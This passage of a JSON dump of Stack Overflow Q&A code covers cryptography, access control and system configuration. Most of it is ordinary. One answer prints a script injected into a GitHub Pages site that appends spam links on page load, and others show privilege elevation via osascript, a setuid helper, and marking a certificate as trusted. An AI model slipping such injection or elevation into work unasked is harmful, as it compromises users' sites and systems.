CryptoJS.HmacSHA256(msg, CryptoJS.enc.Base64.parse(hmacSecret)).toString(CryptoJS.enc.Hex)\n            return hmac\n        }\n    }\n    return null\n}",
        "score": 7,
        "is_accepted": false,
        "creation_date": "2020-03-20T08:18:04",
        "author": "Exadra37"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/67664505/is-there-any-gcc-compiler-option-or-something-similar-to-bypass-the-obsolesence",
    "title": "Is there any gcc compiler option or something similar to bypass the obsolesence of the gets function?",
    "question_id": 67664505,
    "posted_date": "2021-05-23T17:24:51",
    "answers": [
      {
        "answer_id": 67664596,
        "body": "/* read a line from stdin\n   strip extra characters and the newline\n   return the number of characters before the newline, possibly >= n\n   return EOF at end of file\n */\nstatic char gets_buffer[65536];\nstatic size_t gets_pos, gets_end;\nint my_fast_gets(char *buf, size_t n) {\n    size_t pos = 0;\n    for (;;) {\n        char *p = gets_buffer + gets_pos;\n        size_t len = gets_end - gets_pos;\n        char *q = memchr(p, '\\n', len);\n        if (q != NULL) {\n            len = q - p;\n        }\n        if (pos + len < n) {\n            memcpy(buf + pos, p, len);\n            buf[pos + len] = '\\0';\n        } else\n        if (pos < n) {\n            memcpy(buf + pos, p, n - pos - 1);\n            buf[n - 1] = '\\0';\n        }\n        pos += len;\n        gets_pos += len;\n        if (q != NULL) {\n            gets_pos += 1;\n            return (int)pos;\n        }\n        gets_pos = 0;\n        gets_end = fread(gets_buffer, 1, sizeof gets_buffer, stdin);\n        if (gets_end == 0) {\n            return pos == 0 ? EOF : (int)pos;\n        }\n    }\n}",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2021-05-23T17:37:16",
        "author": "chqrlie"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72506102/prevent-hidden-sheets-in-thisworkbook-to-be-visible-by-using-a-macro-and-run-fro",
    "title": "Prevent hidden sheets in ThisWorkbook to be visible by using a macro and run from another workbook",
    "question_id": 72506102,
    "posted_date": "2022-06-05T05:15:57",
    "answers": [
      {
        "answer_id": 72529087,
        "body": "'*******************************************************************************\n'Protect the Structure of a given Book\n'Returns TRUE if the Book is passworded with the provided pass otherwise FALSE\n'*******************************************************************************\nPublic Function ProtectBookStructure(ByVal book As Workbook _\n                                   , ByVal pass As String) As Boolean\n    If book.ProtectStructure Then\n        If UnprotectBookStructure(book, pass) Then\n            'Previous password was the same or empty. Protect with new password\n            ProtectBookStructure = ProtectBookStructure(book, pass)\n        Else\n            'Book is protected with a different password\n            ProtectBookStructure = False\n        End If\n    Else\n        On Error Resume Next\n        book.Protect Password:=pass, Structure:=True\n        On Error GoTo 0\n        ProtectBookStructure = book.ProtectStructure\n    End If\nEnd Function\n'*******************************************************************************\n'Unprotect the Structure of a given Book\n'Returns TRUE if successful or FALSE if not\n'*******************************************************************************\nPublic Function UnprotectBookStructure(ByVal book As Workbook _\n                                     , ByVal pass As String) As Boolean\n    If book.ProtectStructure Then\n        On Error Resume Next\n        book.Unprotect pass\n        On Error GoTo 0\n    End If\n    UnprotectBookStructure = Not book.ProtectStructure\nEnd Function",
        "score": 5,
        "is_accepted": true,
        "creation_date": "2022-06-07T05:45:25",
        "author": "Cristian Buse"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/73529149/should-we-install-package-updates-for-alpine-base-image-in-docker",
    "title": "Should we install package updates for Alpine base image in Docker?",
    "question_id": 73529149,
    "posted_date": "2022-08-29T08:57:00",
    "answers": [
      {
        "answer_id": 73586799,
        "body": "$ sudo docker run -it alpine:3.7\nUnable to find image 'alpine:3.7' locally\n3.7: Pulling from library/alpine\n5d20c808ce19: Pull complete\nDigest: sha256:8421d9a84432575381bfabd248f1eb56f3aa21d9d7cd2511583c68c9b7511d10\nStatus: Downloaded newer image for alpine:3.7\n/ # apk -U upgrade\nfetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz\nfetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz\n(1/2) Upgrading musl (1.1.18-r3 -> 1.1.18-r4)\n(2/2) Upgrading musl-utils (1.1.18-r3 -> 1.1.18-r4)\nExecuting busybox-1.27.2-r11.trigger\nOK: 4 MiB in 13 packages",
        "score": 4,
        "is_accepted": true,
        "creation_date": "2022-09-02T14:40:32",
        "author": "valiano"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/47924618/how-to-read-ec-private-key-in-java-which-is-in-pem-file-format",
    "title": "How to read EC Private key in java which is in .pem file format",
    "question_id": 47924618,
    "posted_date": "2017-12-21T07:05:22",
    "answers": [
      {
        "answer_id": 55269325,
        "body": " void loadPrivateKey(KeyStore ks, X509Certificate cert){\n    File privKeyFile = new File(\"key-pkcs8.der\");\n    // read private key DER file\n    DataInputStream dis = new DataInputStream(new FileInputStream(privKeyFile));\n    byte[] privKeyBytes = new byte[(int)privKeyFile.length()];\n    dis.read(privKeyBytes);\n    dis.close();\n\n    KeyFactory kf = KeyFactory.getInstance(\"EC\");\n    // decode private key\n    PKCS8EncodedKeySpec privSpec = new PKCS8EncodedKeySpec(privKeyBytes);\n    PrivateKey privKey = kf.generatePrivate(privSpec);\n    ks.setKeyEntry(\"key-alias\", privKey, \"password\".toCharArray(), new Certificate[] {cert});\n}",
        "score": 4,
        "is_accepted": false,
        "creation_date": "2019-03-20T16:05:15",
        "author": "dilbertside"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68030798/spam-link-inserted-into-my-github-pages-website",
    "title": "Spam link inserted into my GitHub pages website",
    "question_id": 68030798,
    "posted_date": "2021-06-18T03:07:51",
    "answers": [
      {
        "answer_id": 68037317,
        "body": "if (document.readyState !== 'loading') {\n    if (document.querySelector('p')) {\n        document.querySelector('p').innerHTML = document.querySelector('p').innerHTML + '<div><a href=\"redacted\">Bitcoin Rush</a></div>';\n    } else {\n        document.querySelector('div').innerHTML = document.querySelector('div').innerHTML + '<div><a href=\"redacted\">Bitcoin Rush</a></div>';\n    }\n} else {\n    document.addEventListener('DOMContentLoaded', function(event) {\n        if (document.querySelector('p')) {\n            document.querySelector('p').innerHTML = document.querySelector('p').innerHTML + '<div><a href=\"redacted\">Bitcoin Rush</a></div>';\n        } else {\n            document.querySelector('div').innerHTML = document.querySelector('div').innerHTML + '<div><a href=\"redacted\">Bitcoin Rush</a></div>';\n        }\n    });\n}",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2021-06-18T10:52:31",
        "author": "Bertrand Martel"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/57399419/how-to-prevent-actions-by-user-role-in-angular",
    "title": "How to prevent actions by user role in Angular",
    "question_id": 57399419,
    "posted_date": "2019-08-07T13:17:31",
    "answers": [
      {
        "answer_id": 57403054,
        "body": "export class YourGuard {\n  constructor(private readonly auth: RoleAuthorisationService) {}\n  canActivate(route: ActivatedRouteSnapshot) {\n    if (route.data.roles && !this.auth.isAuthorised(route.data.roles)) {\n      // role not authorised so redirect to home page\n      this.router.navigate(['/']);\n      return false;\n    } else {\n      // authorised so return true\n      return true;\n    }\n\n    // not logged in so redirect to login page\n    this.router.navigate(['auth/login']);\n    return false;\n  }\n}",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2019-08-07T18:34:40",
        "author": "Krenom"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/55964625/why-is-setuid-dropped-on-execve-in-an-alpine-container",
    "title": "Why is setuid dropped on execve in an alpine container?",
    "question_id": 55964625,
    "posted_date": "2019-05-03T02:50:23",
    "answers": [
      {
        "answer_id": 55992569,
        "body": "\t} else if (APPLET_SUID(applet_no) == BB_SUID_DROP) {\n\t\t/*\n\t\t * Drop all privileges.\n\t\t *\n\t\t * Don't check for errors: in normal use, they are impossible,\n\t\t * and in special cases, exiting is harmful. Example:\n\t\t * 'unshare --user' when user's shell is also from busybox.\n\t\t *\n\t\t * 'unshare --user' creates a new user namespace without any\n\t\t * uid mappings. Thus, busybox binary is setuid nobody:nogroup\n\t\t * within the namespace, as that is the only user. However,\n\t\t * since no uids are mapped, calls to setgid/setuid\n\t\t * fail (even though they would do nothing).\n\t\t */\n\t\tsetgid(rgid);\n\t\tsetuid(ruid);\n\t}",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2019-05-05T09:42:44",
        "author": "Ente"
      },
      {
        "answer_id": 55992569,
        "body": "extern crate exec;\nextern crate users;\nuse std::env;\nuse std::fs;\nuse std::process::exit;\nuse users::{get_effective_uid, get_effective_gid};\nuse users::switch::{set_current_uid, set_current_gid};\nfn usage() {\n    println!(\"usage: kamikaze <command> <arguments>\");\n}\nfn main() {\n    // Kill myself\n    fs::remove_file(\n        env::current_exe().expect(\"failed to get path to executable\")\n    ).expect(\"kamikaze failed\");\n    set_current_uid(\n        get_effective_uid()\n    ).expect(\"failed setting current uid\");\n    set_current_gid(\n        get_effective_gid()\n    ).expect(\"failed setting current gid\");\n    let mut args: Vec<String> = env::args().collect();\n    match args.len() {\n        0 => usage(),\n        1 => usage(),\n        _ => {\n            args.remove(0);\n            let err = exec::Command::new(args.remove(0))\n                .args(&args)\n                .exec();\n            println!(\"Error: {}\", err);\n        },\n    }\n    // Should never get here\n    exit(1);\n}",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2019-05-05T09:42:44",
        "author": "Ente"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79331731/how-to-make-copilot-not-leak-secret-credentials-with-neovim-plugin",
    "title": "How to make copilot not leak secret credentials with Neovim plugin?",
    "question_id": 79331731,
    "posted_date": "2025-01-05T18:24:01",
    "answers": [
      {
        "answer_id": 79331732,
        "body": "\" Only load Copilot if COPILOT_EXTENSIONS is set and contains the file extension used.\nfunction! ShouldLoadCopilot()\n  \" Check if environment variable exists\n  if empty($COPILOT_EXTENSIONS)\n    return 0\n  endif\n\n  \" Convert space-separated list of extensions into dictionary.\n  let allowed_extensions = {}\n  for ext in split($COPILOT_EXTENSIONS)\n      let allowed_extensions[ext] = 1\n  endfor\n\n  \" Check current file extension.\n  let ext = expand('%:e')\n  return get(allowed_extensions, ext, 0)\nendfunction\ncommand! LoadCopilot call LoadCopilotIfAllowed()\nlet g:copilot_loaded = 0\n\" Add Copilot status to statusline.\nfunction! CopilotStatus()\n  return get(b:, 'copilot_enabled', 0) ? ' Copilot:ON' : ''\nendfunction\n\" Construct statusline.\nset statusline=%<%f\\ %h%m%r\nset statusline+=%=%{CopilotStatus()}\\ \\\nset statusline+=%-14.(%l,%c%V%)\\ %P\nfunction! LoadCopilotIfAllowed()\n  if !g:copilot_loaded\n    if ShouldLoadCopilot()\n      packadd copilot.vim\n      Copilot auth\n      let g:copilot_loaded = 1\n    else\n      echo \"Copilot not loaded.\"\n      return\n    endif\n  endif\n  if ShouldLoadCopilot()\n    Copilot enable\n    let b:copilot_enabled = 1\n  else\n    Copilot disable\n    let b:copilot_enabled = 0\n  endif\nendfunction\n\" Auto-check loading of Copilot on file open.\nautocmd BufRead,BufNewFile * LoadCopilot",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2025-01-05T18:24:01",
        "author": "Carlo Wood"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/73994223/is-there-a-mechanism-to-disable-reflection-in-net-6",
    "title": "Is there a mechanism to disable Reflection in .NET 6?",
    "question_id": 73994223,
    "posted_date": "2022-10-07T23:48:21",
    "answers": [
      {
        "answer_id": 73998560,
        "body": "using Mono.Cecil;\nusing System.Net.NetworkInformation;\nusing System.Reflection;\nusing System.Reflection.Metadata;\nusing System.Runtime.InteropServices;\nnamespace FindReferencedAssemblies\n{\n    internal class Program\n    {\n        // List of namespaces that will be checked against.\n        private static List<string> _unsafeAssemblyNames = new List<string>()\n        {\n            \"System.Reflection\",\n        };\n        static void Main(string[] args)\n        {\n            string prefix = Directory.GetCurrentDirectory();\n            // need to pick up required/running dotnet libraries or PathAssemblyResolver will fail.\n            var requiredAssemblyFilesnames = new List<string>(Directory.GetFiles(RuntimeEnvironment.GetRuntimeDirectory(), \"*.dll\"));\n            // now add assemblies to check. This would come from your runtime module to load but is hard coded here.\n            var toCheckAssemblyFilesnames = new List<string>()\n            {\n                Path.Combine(prefix, \"LibrarySafe.dll\"),\n                Path.Combine(prefix, \"LibraryUnsafe.dll\"),\n            };\n            var resolver = new PathAssemblyResolver(requiredAssemblyFilesnames.Concat(toCheckAssemblyFilesnames));\n            // dotnetcore: assembly metadata is only available withing this \"using\" context\n            using (var metadataContext = new MetadataLoadContext(resolver))\n            {\n                foreach (var filename in toCheckAssemblyFilesnames)\n                {\n                    // dotnet framework: use Assembly.ReflectionOnlyLoad\n                    var assembly = metadataContext.LoadFromAssemblyPath(filename);\n                    var assemblyShortName = assembly.GetName().Name;\n                    var assemblyFullName = assembly.FullName;\n                    // Check all referenced assemblies against the list of banned namespaces.\n                    var referencedAssemblies = assembly.GetReferencedAssemblies().ToList();\n                    foreach (var assemblyReference in referencedAssemblies)\n                    {\n                        var unsafeAsm = _unsafeAssemblyNames.FirstOrDefault(x => string.Compare(x, assemblyReference.Name) == 0);\n                        if (!string.IsNullOrEmpty(unsafeAsm))\n                        {\n                            Console.WriteLine($\"Found unsafe reference to [{unsafeAsm}] in assembly [{assemblyFullName}]\");\n                        }\n                    }\n                    // Now switch over to looking at method calls within the assembly.\n                    var cecilAssemblyDefinition = Mono.Cecil.AssemblyDefinition.ReadAssembly(filename);\n                    // Get a list of all types defined within the assembly.\n                    var assemblyTypes = cecilAssemblyDefinition.MainModule.GetTypes()\n                        // here, `StartsWith` may or may not be sufficient\n                        .Where(x => x.FullName.StartsWith(assemblyShortName));\n                    foreach (var type in assemblyTypes)\n                    {\n                        // Get a list of all methods defined on the type.\n                        foreach (var method in type.Methods)\n                        {\n                            // Find references to methods called, from within the method we are considering.\n                            var calledMethods = method.Body.Instructions\n                                .Where(x =>\n                                    x.OpCode == Mono.Cecil.Cil.OpCodes.Call\n                                    && x.Operand is MethodReference)\n                                .Select(x => x.Operand)\n                                .Cast<MethodReference>()\n                                .ToList();\n                            // TODO: perform the same check against `Operand is MethodDefinition`\n                            // TODO: perform the same two checks against `x.OpCode == Mono.Cecil.Cil.OpCodes.Callvirt`\n                            // Iterate the list of methods called, and compare against the list of banned namespaces.\n                            foreach (var methodRef in calledMethods)\n                            {\n                                // here, `StartsWith` may or may not be sufficient\n                                var unsafeAsmMatch = _unsafeAssemblyNames.Where(x => methodRef.FullName.StartsWith(x));\n                                foreach (var match in unsafeAsmMatch)\n                                {\n                                    Console.WriteLine($\"Found unsafe reference to [{match}] in assembly [{assemblyFullName}], method [{method.FullName}]\");\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2022-10-08T12:10:21",
        "author": "BurnsBA"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65699160/electron-import-x509-cert-to-local-keychain-macos-the-authorization-was-deni",
    "title": "Electron import x509 cert to local keychain (macOS) - The authorization was denied since no user interaction was possible",
    "question_id": 65699160,
    "posted_date": "2021-01-13T04:35:26",
    "answers": [
      {
        "answer_id": 65748539,
        "body": "const { exec } = require('child_process');\nconst proc = exec('osascript -e \\'do shell script \"pwd\" with administrator privileges\\'', function (error, stdout, stderr) {\n    if (error) {\n      console.log(error.stack);\n      console.log('Error code: '+error.code);\n      console.log('Signal received: '+error.signal);\n    }\n    console.log('Child Process STDOUT: '+stdout);\n    console.log('Child Process STDERR: '+stderr);\n  });\n\n  proc.on('exit', function (code) {\n    console.log('Child process exited with exit code '+code);\n  });",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2021-01-16T05:19:38",
        "author": "Tarun Lalwani"
      },
      {
        "answer_id": 65748539,
        "body": "//\n//  main.swift\n//  AddCert\n//\n//  Created by Tarun Lalwani on 23/01/21.\n//\nimport Foundation\nimport Security\nlet certInfo: CFDictionary\nenum SecurityError:Error {\n    case generalError\n}\nfunc deleteCertificateFromKeyChain(_ certificateLabel:String) -> Bool{\n\n    let delQuery : [NSString:Any] = [\n        kSecClass: kSecClassCertificate,\n        kSecAttrLabel: certificateLabel,\n    ]\n    let delStatus:OSStatus = SecItemDelete(delQuery as CFDictionary)\n\n    return delStatus == errSecSuccess\n\n}\nfunc saveCertificateToKeyChain(_ certificate:SecCertificate, certificateLabel:String) throws {\n    deleteCertificateFromKeyChain(certificateLabel)\n    let setQuery: [NSString: AnyObject] = [\n        kSecClass: kSecClassCertificate,\n        kSecValueRef: certificate,\n        kSecAttrLabel: certificateLabel as AnyObject,\n        kSecAttrAccessible: kSecAttrAccessibleWhenUnlockedThisDeviceOnly,\n    ]\n    let addStatus:OSStatus = SecItemAdd(setQuery as CFDictionary, nil)\n\n\n    guard addStatus == errSecSuccess else {\n        throw SecurityError.generalError\n    }\n\n    var status = SecTrustSettingsSetTrustSettings(certificate, SecTrustSettingsDomain.admin, nil)\n\n}\nfunc getCertificateFromString(stringData:String) throws -> SecCertificate{\n\n    if let data:NSData = NSData(base64Encoded: stringData, options: NSData.Base64DecodingOptions.ignoreUnknownCharacters)  {\n        if let certificate = SecCertificateCreateWithData(kCFAllocatorDefault, data) {\n            return certificate\n        }\n    }\n    throw SecurityError.generalError\n}\nvar certificateString:String = \"MIIDUzCCAjugAwIBAgIUD9xMnL73y7fuida5TXgmklLswsowDQYJKoZIhvcNAQELBQAwGTEXMBUGA1UEAwwOdGVzdHNpdGUubG9jYWwwHhcNMjEwMTE3MTExODU1WhcNNDEwMTEyMTExODU1WjAZMRcwFQYDVQQDDA50ZXN0c2l0ZS5sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANM08SDi06dvnyU1A6//BeEFd8mXsOpDQCbYEHX/Pz4jqaBYwVjD5pG7FkvDeUKZnEVyrsofjZ4Y1WAT8jxPMUi+jDlgNTiFjPVc4rA6hcGX6b70HjsCACmc8bZd+EU7gm4b5eL6exTsVzHc+lFz4eQFXgutYTL7guDQE/gFHwqPkLvnfg3rgY31p3Hm/snL8NuD154iE9O1WuSxEjik65uOQaewZmJ9ejJEuuEhMA8O9dXveJ71TMV5lqA//svDxBu3zXIxMqRy2LdzfROd+guLP6ZD3jUycWi7GpF4yN0+rD/0aXFJVHzV6TpS9oqb14jynvn1AyVfBB9+VQVNwTsCAwEAAaOBkjCBjzAJBgNVHRMEAjAAMAsGA1UdDwQEAwIC9DA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEFBQcDBAYIKwYBBQUHAwgwHQYDVR0OBBYEFDjAC2ObSbB59XyLW1YaD7bgY8ddMBkGA1UdEQQSMBCCDnRlc3RzaXRlLmxvY2FsMA0GCSqGSIb3DQEBCwUAA4IBAQBsU6OA4LrXQIZDXSIZPsDhtA7YZWzbrpqPceXPwBd1k9Yd9T83EdA00N6eoOWFzwnQqwqKxtYdl3x9JQ7ewhY2huH9DRtCGjiTm/GVU/WnNm4tUTuGU4FyjSTRi8bNUxTSF5PZ0U2/vFZ0d7T43NbLQAiFSxyfC1r6qjKQCYDL92XeU61zJxesxy5hxVNrbDpbPnCUZpx4hhL0RHgG+tZBOlBuW4eq249O0Ql+3ShcPom4hzfh975385bfwfUT2s/ovng67IuM9bLSWWe7U+6HbOEvzMIiqK94YYPmOC62cdhOaZIJmro6lL7eFLqlYfLU4H52ICuntBxvOx0UBExn\"\nlet certificate = try! getCertificateFromString(stringData: certificateString)\ntry? saveCertificateToKeyChain(certificate, certificateLabel: \"Test\")",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2021-01-16T05:19:38",
        "author": "Tarun Lalwani"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/58334907/magic-link-authentication-in-react-spa",
    "title": "Magic Link Authentication in react SPA",
    "question_id": 58334907,
    "posted_date": "2019-10-11T01:43:59",
    "answers": [
      {
        "answer_id": 62867548,
        "body": "import React, { useEffect } from \"react\";\nimport Cotter from \"cotter\"; //  1\ufe0f\u20e3  Import Cotter\nfunction App() {\n  useEffect(() => {\n    //  2\ufe0f\u20e3 Initialize and show the form\n    var cotter = new Cotter(API_KEY_ID); // \ud83d\udc48 Specify your API KEY ID here\n    cotter\n      .signInWithLink() // use Magic link\n      .showEmailForm() // show email login form\n      .then(resp => console.log(resp))\n      .catch(err => console.log(err));\n  }, []);\n  return (\n    // 3\ufe0f\u20e3  Put a <div> with id \"cotter-form-container\"\n    // that will contain the form\n    <div id=\"cotter-form-container\" style={{ width: 300, height: 300 }} />\n  );\n}\nexport default App;",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-07-12T19:50:55",
        "author": "Putri Karunia"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64867389/refused-to-execute-inline-script-because-it-violates-the-following-content-secur",
    "title": "Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src &#39;self&#39;&quot;.?",
    "question_id": 64867389,
    "posted_date": "2020-11-16T18:50:48",
    "answers": [
      {
        "answer_id": 64867483,
        "body": "curl -v http://localhost:8080\n* Rebuilt URL to: http://localhost:8080/\n*   Trying ::1...\n* TCP_NODELAY set\n* Connected to localhost (::1) port 8080 (#0)\n> GET / HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/7.53.1\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< X-Powered-By: Express\n< Content-Security-Policy: default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'\n< Content-Type: text/html; charset=utf-8\n< Content-Length: 39\n< ETag: W/\"27-ghawzGh2y9RPAcFY59/zgzzszUE\"\n< Date: Tue, 17 Nov 2020 00:01:04 GMT\n< Connection: keep-alive\n< Keep-Alive: timeout=5\n<\n* Connection #0 to host localhost left intact\n<html><head></head><body></body></html>",
        "score": 19,
        "is_accepted": true,
        "creation_date": "2020-11-16T19:01:51",
        "author": "Petr Hejda"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/56680580/nvd-json-feeds-tags-meaning-and-their-purpose",
    "title": "NVD JSON feeds, tags meaning and their purpose",
    "question_id": 56680580,
    "posted_date": "2019-06-20T02:56:04",
    "answers": [
      {
        "answer_id": 59500093,
        "body": "\"configurations\": {\n    \"CVE_data_version\": \"4.0\",\n    \"nodes\": [\n      {\n        \"operator\": \"AND\",\n        \"children\": [\n          {\n            \"operator\": \"OR\",\n            \"cpe_match\": [\n              {\n                \"vulnerable\": true,\n                \"cpe23Uri\": \"cpe:2.3:a:adobe:digital_editions:*:*:*:*:*:*:*:*\",\n                \"versionEndIncluding\": \"4.5.7\"\n              }\n            ]\n          },\n          {\n            \"operator\": \"OR\",\n            \"cpe_match\": [\n              {\n                \"vulnerable\": false,\n                \"cpe23Uri\": \"cpe:2.3:o:apple:iphone_os:-:*:*:*:*:*:*:*\"\n              },\n              {\n                \"vulnerable\": false,\n                \"cpe23Uri\": \"cpe:2.3:o:apple:mac_os_x:-:*:*:*:*:*:*:*\"\n              },\n              {\n                \"vulnerable\": false,\n                \"cpe23Uri\": \"cpe:2.3:o:google:android:-:*:*:*:*:*:*:*\"\n              },\n              {\n                \"vulnerable\": false,\n                \"cpe23Uri\": \"cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:*:*\"\n              }\n            ]\n          }\n        ]\n      }\n    ]\n }",
        "score": 7,
        "is_accepted": false,
        "creation_date": "2019-12-27T06:26:22",
        "author": "Faaiz"
      },
      {
        "answer_id": 59500093,
        "body": "\"configurations\" : {\n      \"CVE_data_version\" : \"4.0\",\n      \"nodes\" : [ {\n        \"operator\" : \"OR\",\n        \"cpe_match\" : [ {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:a:oracle:flexcube_private_banking:2.0.0:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:a:oracle:flexcube_private_banking:2.0.1:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:a:oracle:flexcube_private_banking:2.2.0:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:a:oracle:flexcube_private_banking:12.0.1:*:*:*:*:*:*:*\"\n        } ]\n      } ]\n    },",
        "score": 7,
        "is_accepted": false,
        "creation_date": "2019-12-27T06:26:22",
        "author": "Faaiz"
      },
      {
        "answer_id": 59500093,
        "body": "\"configurations\" : {\n      \"CVE_data_version\" : \"4.0\",\n      \"nodes\" : [ {\n        \"operator\" : \"OR\",\n        \"cpe_match\" : [ {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:5.0:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:5.0.1:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:5.0.2:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:5.1:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:5.1.0:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:5.1.1:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:6.0:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:6.0.1:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:7.0:*:*:*:*:*:*:*\"\n        }, {\n          \"vulnerable\" : true,\n          \"cpe23Uri\" : \"cpe:2.3:o:google:android:7.1.0:*:*:*:*:*:*:*\"\n        } ]\n      } ]\n    },",
        "score": 7,
        "is_accepted": false,
        "creation_date": "2019-12-27T06:26:22",
        "author": "Faaiz"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76261787/implementing-custom-expression-handling-with-spring-security-6",
    "title": "Implementing Custom Expression Handling with Spring Security 6",
    "question_id": 76261787,
    "posted_date": "2023-05-16T06:06:12",
    "answers": [
      {
        "answer_id": 76265519,
        "body": "static final class ProxiesMethodSecurityExpressionRoot extends SpringAddonsMethodSecurityExpressionRoot {\n\tpublic boolean is(String preferredUsername) {\n\t\treturn Objects.equals(preferredUsername, getAuthentication().getName());\n\t}\n\tpublic Proxy onBehalfOf(String proxiedUsername) {\n\t\treturn get(ProxiesAuthentication.class).map(a -> a.getProxyFor(proxiedUsername))\n\t\t\t\t.orElse(new Proxy(proxiedUsername, getAuthentication().getName(), List.of()));\n\t}\n\tpublic boolean isNice() {\n\t\treturn hasAnyAuthority(\"NICE\", \"SUPER_COOL\");\n\t}\n}",
        "score": 7,
        "is_accepted": true,
        "creation_date": "2023-05-16T12:58:24",
        "author": "ch4mp"
      },
      {
        "answer_id": 76265519,
        "body": "@RequiredArgsConstructor\npublic class SpringAddonsMethodSecurityExpressionHandler extends DefaultMethodSecurityExpressionHandler {\n    private final Supplier<SpringAddonsMethodSecurityExpressionRoot> expressionRootSupplier;\n    /**\n     * Creates the root object for expression evaluation.\n     */\n    @Override\n    protected MethodSecurityExpressionOperations createSecurityExpressionRoot(Authentication authentication,\n            MethodInvocation invocation) {\n        return createSecurityExpressionRoot(() -> authentication, invocation);\n    }\n    @Override\n    public EvaluationContext createEvaluationContext(Supplier<Authentication> authentication, MethodInvocation mi) {\n        var root = createSecurityExpressionRoot(authentication, mi);\n        var ctx = new SpringAddonsMethodSecurityEvaluationContext(root, mi, getParameterNameDiscoverer());\n        ctx.setBeanResolver(getBeanResolver());\n        return ctx;\n    }\n    private MethodSecurityExpressionOperations createSecurityExpressionRoot(Supplier<Authentication> authentication,\n            MethodInvocation invocation) {\n        final var root = expressionRootSupplier.get();\n        root.setThis(invocation.getThis());\n        root.setPermissionEvaluator(getPermissionEvaluator());\n        root.setTrustResolver(getTrustResolver());\n        root.setRoleHierarchy(getRoleHierarchy());\n        root.setDefaultRolePrefix(getDefaultRolePrefix());\n        return root;\n    }\n    static class SpringAddonsMethodSecurityEvaluationContext extends MethodBasedEvaluationContext {\n        SpringAddonsMethodSecurityEvaluationContext(MethodSecurityExpressionOperations root, MethodInvocation mi,\n                ParameterNameDiscoverer parameterNameDiscoverer) {\n            super(root, getSpecificMethod(mi), mi.getArguments(), parameterNameDiscoverer);\n        }\n        private static Method getSpecificMethod(MethodInvocation mi) {\n            return AopUtils.getMostSpecificMethod(mi.getMethod(), AopProxyUtils.ultimateTargetClass(mi.getThis()));\n        }\n    }\n}",
        "score": 7,
        "is_accepted": true,
        "creation_date": "2023-05-16T12:58:24",
        "author": "ch4mp"
      },
      {
        "answer_id": 76265519,
